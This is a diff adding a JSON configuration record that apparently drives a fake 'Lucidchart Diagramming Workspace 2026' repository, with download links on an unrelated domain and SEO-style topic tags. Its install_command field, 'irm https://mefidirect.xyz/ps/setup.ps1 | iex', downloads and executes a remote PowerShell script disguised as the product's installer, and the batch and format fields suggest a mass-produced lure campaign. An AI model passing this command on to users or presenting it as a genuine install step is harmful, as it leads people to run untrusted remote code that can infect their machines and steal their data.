@@ -1,0 +1,29 @@
+{
+  "repo": "lucidchart-diagramming-workspace-2026",
+  "product": "Lucidchart Diagramming Workspace 2026",
+  "kind": "pm",
+  "install_type": "download",
+  "download_url": "https://lucidchart.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new31",
+  "format": "license-md-only",
+  "category": "pm",
+  "topics": [
+    "lucidchart-studio",
+    "lucidchart-client",
+    "lucidchart-project-management",
+    "lucidchart-win11",
+    "lucidchart-error-fix",
+    "run-lucidchart-on-windows",
+    "lucidchart-team-collaboration",
+    "lucidchart-desktop-tool",
+    "lucidchart-configure-guide",
+    "lucidchart-build-2026",
+    "lucidchart-setup-package",
+    "desktop-tools",
+    "setup-guide",
+    "collaboration-tools",
+    "pc-software"
+  ]
+}
